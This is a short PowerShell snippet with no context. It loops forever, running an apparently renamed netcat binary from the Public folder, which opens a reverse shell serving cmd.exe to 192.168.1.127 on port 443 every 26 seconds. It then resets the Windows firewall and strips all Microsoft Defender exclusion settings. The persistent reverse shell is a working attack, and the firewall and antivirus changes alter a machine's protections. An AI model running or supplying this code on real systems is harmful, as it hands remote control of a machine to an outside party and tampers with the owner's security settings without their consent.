while ($true){C:\Users\Public\RNM.exe -nv 192.168.1.127 443 -e cmd.exe ; Start-Sleep 26}
netsh advfirewall reset

$prefs = Get-MpPreference
if ($prefs.ExclusionPath) { Remove-MpPreference -ExclusionPath $prefs.ExclusionPath }
if ($prefs.ExclusionExtension) { Remove-MpPreference -ExclusionExtension $prefs.ExclusionExtension }
if ($prefs.ExclusionProcess) { Remove-MpPreference -ExclusionProcess $prefs.ExclusionProcess }
if ($prefs.ExclusionIpAddress) { Remove-MpPreference -ExclusionIpAddress $prefs.ExclusionIpAddress }
